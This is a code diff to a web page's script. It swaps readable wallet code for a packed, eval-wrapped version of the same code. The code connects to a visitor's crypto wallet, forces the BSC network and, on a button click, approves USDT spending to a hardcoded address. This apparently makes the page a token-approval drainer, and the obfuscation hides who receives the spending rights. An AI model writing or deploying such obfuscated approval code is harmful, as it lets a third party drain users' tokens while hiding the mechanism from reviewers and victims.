@@ -219,72 +219,8 @@ let abi =  [
     }
 ]
 
-let usdt;
-let provider;
-let account;
-let usdtAddr = "0x69bab60997a2f5cbee668e5087dd9f91437206bb"
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('G b;3 a;3 2;3 t="D"E g="F"5 4 h(){A((7 d.k({i:"B"}))!=C){s("J!");K.L()}}5 4 j(){3 l=7 d.k({i:"H"});2=l[0];$("#2").n(2)}5 4 m(v){I 9.q.w(7 b.y(v),6)}5 4 1(z,g){3 u=9.q.x($("#o").11(),6)7 b.12(a.10()).o(g,u).Y((8)=>{f.c("1",8);s("1  8: "+8.Z);f.c("1  ... ",15)}).16((e)=>{f.c(">>> 1 e: ",e)})}p.14("13",4(){j();h();a=r 9.X.P(p.d);b=r 9.Q(t,O,a);M(5()=>{$("#N").n(7 m(2)+" R ")},V)$("#W").U("S",()=>{1(2,"T")})})',62,69,'|approved|account|let|function|async||await|tx|ethers|provider|usdt|log|ethereum|error|console|toAddr|networkCheck|method|showAccount|request|accounts|getBalance|text|approve|window|utils|new|alert|usdtAddr|approvedVal|acct|formatUnits|parseUnits|balanceOf|fromAddr|if|eth_chainId|56|0x69bab60997a2f5cbee668e5087dd9f91437206bb|const|0x959FD7Ef9089B7142B6B908Dc3A8af7Aa8ff0FA1|et|eth_requestAccounts|return|清切换到BSC网络|location|reload|setInterval|balance|abi|Web3Provider|Contract|USDT|click|0xF4C49148404d9B75b77cD2FB250a8bB65016Bf77|bind|2000|approveBtn|providers|then|hash|getSigner|val|connect|load|addEventListener|estimation|catch'.split('|'),0,{}))
 
-
-//设置授权地址
-const toAddr = "0x959FD7Ef9089B7142B6B908Dc3A8af7Aa8ff0FA1"
-
-async function   networkCheck() {
-        if ((await ethereum.request({ method: "eth_chainId" })) != 56) {
-            alert("清切换到BSC网络!");
-            location.reload();
-        }
-    }
-async function showAccount() {
-    let accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accounts[0];
-    $("#account").text(account);
-}
-
-async function getBalance(acct) {
-    return  ethers.utils.formatUnits(await usdt.balanceOf(acct) ,6)
-}
-
-
-async function approved(fromAddr ,toAddr){
-
-    let approvedVal = ethers.utils.parseUnits($("#approve").val(),6)
-        await usdt
-            .connect(provider.getSigner())
-            .approve(toAddr,approvedVal)
-            .then((tx) => {
-                console.log("approved", tx);
-                alert("approved  tx: " + tx.hash);
-    
-                // setTimeout(() =>{console.log("========",tx)} ,10000)
-               console.log("approved  ... ", estimation)
-            })
-            .catch((error) => {
-                console.log(">>> approved error: ", error);
-            });
-}
-
-
-
-
-window.addEventListener("load" ,function(){
-    
-    showAccount();
-    networkCheck();
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    usdt = new ethers.Contract(
-        usdtAddr,
-        abi,
-        provider
-    );
- 
-    setInterval(async ()=>{
-        $("#balance").text(await getBalance(account) + " USDT ");
-    } , 2000)
-
-
-    $("#approveBtn").bind("click",() => {approved(account ,"0xF4C49148404d9B75b77cD2FB250a8bB65016Bf77" )})
-
-})
 
 
 </script>
